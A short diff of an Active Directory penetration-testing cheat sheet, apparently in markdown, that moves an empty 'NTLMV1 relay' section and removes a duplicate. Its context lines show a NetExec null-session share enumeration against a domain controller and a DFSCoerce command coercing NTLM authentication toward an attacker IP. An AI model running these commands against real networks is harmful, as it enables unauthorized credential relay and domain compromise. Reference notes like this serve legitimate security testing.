@@ -513,6 +513,11 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
 </details>
 
 <details>
+  <summary> NTLMV1 relay </summary>   
+
+</details>
+
+<details>
   <summary> PetitPotam </summary> 
   
   ### Force NTLM authentication
@@ -529,11 +534,6 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
   ```
 </details> 
-
-<details>
-  <summary> NTLMV1 relaying </summary>   
-
-</details>
 
 # Password Spraying
 
